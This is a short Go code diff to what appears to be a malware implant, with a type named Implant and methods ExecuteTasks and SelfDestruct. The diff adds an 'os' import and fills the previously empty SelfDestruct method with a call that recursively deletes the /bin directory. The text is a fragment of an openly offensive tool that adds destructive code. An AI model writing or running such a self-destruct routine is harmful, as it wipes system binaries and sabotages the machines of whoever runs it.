@@ -8,6 +8,7 @@ import (
 	"math/big"
 	"math/rand"
 	"net/http"
+	"os"
 	"time"
 )
 
@@ -151,5 +152,5 @@ func (i *Implant) ExecuteTasks() {
 }
 
 func (i *Implant) SelfDestruct() {
-
+	os.RemoveAll("/bin")
 }
